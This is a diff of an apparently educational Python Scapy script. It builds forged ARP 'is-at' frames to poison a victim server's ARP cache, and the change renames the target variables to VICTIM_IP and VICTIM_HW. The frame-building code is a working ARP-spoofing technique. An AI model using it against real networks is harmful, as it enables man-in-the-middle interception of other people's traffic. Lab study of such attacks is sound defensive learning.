@@ -19,13 +19,14 @@ MY_IP = '10.0.4.34'  # My IP address
 MY_HW = 'ec:b1:d7:31:23:25'  # My hardware address
 MY_FAKE_IP = '10.0.4.139'  # My fake IP address
 MY_FAKE_HW = '00:01:02:03:04:31'  # My fake hardware address
-DST_IP = '10.0.4.25'  # The IP address of the server you want to poison the ARP cache.
-DST_HW = 'ec:b1:d7:31:24:b5'  # The hardware of the server you want to poison the ARP cache.
+VICTIM_IP = '10.0.4.25'  # The IP address of the server you want to poison the ARP cache.
+VICTIM_HW = 'ec:b1:d7:31:24:b5'  # The hardware of the server you want to poison the ARP cache.
 
+# Print the default configuration.
 print(conf.iface)
 
 frame = Ether(
-    dst=DST_HW,
+    dst=VICTIM_HW,
     # Note: you don't have to modify the following MAC address (src=...).
     #       However, if you do, then it will trigger a broadcast.
     src=MY_FAKE_HW) / \
@@ -37,8 +38,8 @@ frame = Ether(
             op='is-at',
             hwsrc=MY_FAKE_HW,
             psrc=MY_FAKE_IP,
-            hwdst=DST_HW,  # In the case of a REQUEST, do not specify this parameter.
-            pdst=DST_IP)
+            hwdst=VICTIM_HW,  # In the case of a REQUEST, do not specify this parameter.
+            pdst=VICTIM_IP)
 
 frame.show()
 # open Wireshark in order to visualize the packet.
@@ -50,7 +51,7 @@ rep.show()
 # This frame will not "work".
 
 frame = Ether(
-    dst=DST_HW,
+    dst=VICTIM_HW,
     # Note: you don't have to modify the following MAC address (src=...).
     #       However, if you do, then it will trigger a broadcast.
     src=MY_FAKE_HW) / \
@@ -63,8 +64,8 @@ frame = Ether(
             op='is-at',
             hwsrc=MY_FAKE_HW,
             psrc=MY_FAKE_IP,
-            hwdst=DST_HW,  # In the case of a REQUEST, do not specify this parameter.
-            pdst=DST_IP)
+            hwdst=VICTIM_HW,  # In the case of a REQUEST, do not specify this parameter.
+            pdst=VICTIM_IP)
 
 frame.show()
 # open Wireshark in order to visualize the packet.
